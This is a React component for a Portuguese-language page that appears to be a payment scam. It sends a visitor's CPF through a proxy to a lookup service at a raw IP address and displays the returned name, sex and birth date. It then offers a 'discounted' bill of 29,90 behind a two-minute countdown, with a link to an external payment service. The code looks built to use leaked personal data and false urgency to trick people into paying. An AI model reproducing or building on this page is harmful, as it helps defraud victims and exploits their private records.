import { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import Confetti from "react-confetti";
import useWindowSize from "react-use/lib/useWindowSize";

export default function Aprovado() {
  const location = useLocation();
  const cpf = (location.state as { cpf: string })?.cpf;

  const [dados, setDados] = useState<{
    cpf: string;
    nome: string;
    sexo: string;
    nascimento: string;
  } | null>(null);

  const [erro, setErro] = useState<string | null>(null);
  const { width, height } = useWindowSize();
  const [tempoRestante, setTempoRestante] = useState(120); // 2 minutos

  useEffect(() => {
    if (!cpf) {
      setErro("CPF não informado.");
      return;
    }

    const fetchResultado = async () => {
      try {
        const response = await fetch(
          `https://proxy-1mu0.onrender.com/http://185.101.104.231:3001/search?cpf=${cpf}`
        );

        if (!response.ok) throw new Error("Erro ao buscar CPF");

        const text = await response.text();
        const [cpfRetorno, nome, sexo, nascimento] = text.replace("%", "").split("|");

        setDados({
          cpf: cpfRetorno,
          nome,
          sexo,
          nascimento,
        });
      } catch (error) {
        setErro("Não foi possível obter o resultado.");
      }
    };

    fetchResultado();
  }, [cpf]);

  useEffect(() => {
    if (!dados) return;
    const timer = setInterval(() => {
      setTempoRestante((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [dados]);

  const formatarTempo = (segundos: number) => {
    const min = Math.floor(segundos / 60).toString().padStart(2, "0");
    const sec = (segundos % 60).toString().padStart(2, "0");
    return `${min}:${sec}`;
  };

  return (
    <div className="min-h-screen bg-[#ff6a00] flex items-center justify-center text-white px-4 font-montserrat relative overflow-hidden">
      {dados && <Confetti width={width} height={height} numberOfPieces={400} recycle={false} />}

      <div className="text-center max-w-md z-10">
        <h1 className="text-5xl font-extrabold mb-6 animate-bounce">🎉 Parabéns!</h1>

        {erro ? (
          <p className="text-lg text-red-200">{erro}</p>
        ) : !dados ? (
          <p className="text-lg animate-pulse">Consultando CPF...</p>
        ) : (
          <>
            <p className="text-xl mb-4">
              {dados.nome}, você conseguiu!{" "}
              <span className="font-bold text-yellow-300">
                sua fatura pagando AGORA sai a 29,90
              </span>
            </p>

            <div className="bg-white text-[#333] rounded-lg p-4 shadow-md text-left">
              <p><strong>CPF:</strong> {dados.cpf}</p>
              <p><strong>Sexo:</strong> {dados.sexo}</p>
              {dados.nascimento && (
                <p><strong>Nascimento:</strong> {dados.nascimento}</p>
              )}
            </div>

            <div className="mt-10 bg-gradient-to-r from-[#ff6a00] to-yellow-400 p-6 rounded-xl shadow-xl">
              <p className="text-2xl font-semibold text-white mb-3">
                Pague agora com <span className="underline underline-offset-4">desconto exclusivo</span>!
              </p>

              <p className="text-3xl font-extrabold text-red-600 animate-pulse drop-shadow-md">
                Oferta expira em: {formatarTempo(tempoRestante)}
              </p>

              {tempoRestante > 0 ? (
                <a
                  href="https://app.express-pay.app/link/93360161-fed0-4ae0-a8ee-b366350b435e"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="mt-6 inline-block px-10 py-4 rounded-full bg-white text-[#ff6a00] font-bold text-lg shadow-lg transition-all hover:scale-110 animate-pulse"
                >
                  🎯 PAGAR COM DESCONTO AGORA
                </a>
              ) : (
                <p className="mt-6 text-lg text-white font-bold">
                  ⏳ Oferta expirada. Tente novamente mais tarde.
                </p>
              )}
            </div>
          </>
        )}
      </div>
    </div>
  );
}
